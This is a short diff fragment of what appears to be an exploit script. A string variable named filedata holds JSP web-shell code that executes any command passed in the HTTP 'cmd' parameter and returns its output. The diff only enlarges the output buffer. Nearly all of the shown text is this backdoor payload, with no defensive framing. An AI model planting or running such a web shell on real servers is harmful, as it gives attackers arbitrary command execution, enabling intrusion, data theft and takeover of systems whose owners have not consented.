@@ -6,7 +6,7 @@ filedata = '''
 InputStream in =
 Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
 ByteArrayOutputStream baos = new ByteArrayOutputStream();
-byte[] b = new byte[1024];
+byte[] b = new byte[4096];
 int a = -1;
 while ((a = in.read(b)) != -1) {
 baos.write(b, 0, a);
